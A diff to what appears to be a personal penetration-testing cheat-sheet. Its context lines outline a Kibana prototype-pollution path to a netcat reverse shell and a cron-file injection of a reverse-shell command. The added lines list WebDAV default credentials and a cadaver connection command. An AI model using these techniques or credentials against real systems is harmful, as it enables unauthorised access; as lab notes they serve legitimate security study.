@@ -179,7 +179,6 @@ and executing a script with path given in `sudo -l` e.g `sudo -u root /usr/bin/p
 Kibana runs usually on port `5601`
 
 It is always good to check it's version (Management section) and if it is vulnerable to `protype pollution`.
-
 TL;DR We run netcat and inject a payload in Timelion, run it and open Canvas to get shell in netcat's terminal.
 
 ```
@@ -611,3 +610,16 @@ printf 'revshell time; /tmp/rev\n' > FILE
 
 
 Creates a /tmp/rev in stream and then prints content to FILE which is a cron
+
+
+<br />
+<br />
+
+WEBDAV
+
+wampp --> default login
+xampp --> default pass
+
+cadaver http://10.10.0.1/webdav
+
+--> connect to webdav
